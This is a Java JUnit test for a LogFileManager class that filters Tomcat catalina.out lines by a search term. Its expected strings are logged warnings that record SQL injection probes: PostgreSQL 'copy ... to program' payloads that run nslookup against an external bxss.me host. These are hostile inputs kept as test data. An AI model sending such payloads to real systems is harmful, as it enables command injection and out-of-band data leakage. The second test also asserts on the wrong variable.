package Managers;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;

class LogFileManagerTest {


    @Test
    void testReadLogFileWithoutBackslash() {

        ConfigurationManager config = new ConfigurationManager();

        LogFileManager logFileManager = new LogFileManager();
        //ohne backslash
        List<String> testreadLogFile = logFileManager.readLogFile("dns.sqli.", "C:/Users/alkhd/Desktop/ProjektArbeit/catalina.out");

        String[] expected = {"02-Aug-2019 14:14:05.258 WARNUNG [https-jsse-nio-8543-exec-1226] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2943.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:07.342 WARNUNG [https-jsse-nio-8543-exec-1218] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2948.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:09.668 WARNUNG [https-jsse-nio-8543-exec-1227] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2952.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:13.403 WARNUNG [https-jsse-nio-8543-exec-1228] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2955.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:17.731 WARNUNG [https-jsse-nio-8543-exec-1197] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2960.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:20.548 WARNUNG [https-jsse-nio-8543-exec-1246] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2964.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:22.543 WARNUNG [https-jsse-nio-8543-exec-1226] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2968.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:28.293 WARNUNG [https-jsse-nio-8543-exec-1226] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2982.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:32.200 WARNUNG [https-jsse-nio-8543-exec-1238] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2984.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:35.085 WARNUNG [https-jsse-nio-8543-exec-1242] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2986.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
        };

        assertArrayEquals(expected, testreadLogFile.toArray());

    }//testReadLogFileWithoutBackslash()

    @Test
    void testReadLogFileWithBackslash() {

        ConfigurationManager config = new ConfigurationManager();

        LogFileManager logFileManager = new LogFileManager();

        List<String> testreadLogFile = logFileManager.readLogFile("dns.sqli.", "C:/Users/alkhd/Desktop/ProjektArbeit/catalina.out");

        String[] expected = {"02-Aug-2019 14:14:05.258 WARNUNG [https-jsse-nio-8543-exec-1226] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2943.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:07.342 WARNUNG [https-jsse-nio-8543-exec-1218] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2948.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:09.668 WARNUNG [https-jsse-nio-8543-exec-1227] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2952.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:13.403 WARNUNG [https-jsse-nio-8543-exec-1228] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2955.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:17.731 WARNUNG [https-jsse-nio-8543-exec-1197] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2960.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:20.548 WARNUNG [https-jsse-nio-8543-exec-1246] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2964.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:22.543 WARNUNG [https-jsse-nio-8543-exec-1226] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2968.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:28.293 WARNUNG [https-jsse-nio-8543-exec-1226] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2982.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:32.200 WARNUNG [https-jsse-nio-8543-exec-1238] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2984.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
                , "02-Aug-2019 14:14:35.085 WARNUNG [https-jsse-nio-8543-exec-1242] org.primefaces.application.resource.PrimeResourceHandler.handleResourceRequest No dynamic resource handler registered for: sc';copy (select '') to program 'nslookup dns.sqli.\\018090.41239-2986.41239.809c1.\\1.bxss.me. Do you miss a dependency?"
        };

        // mit backslash  in nue test
        List<String> testreadLogFile_ = logFileManager.readLogFile("dns.sqli.\\\\", "C:/Users/alkhd/Desktop/ProjektArbeit/catalina.out");

        assertArrayEquals(expected, testreadLogFile.toArray());
    }

}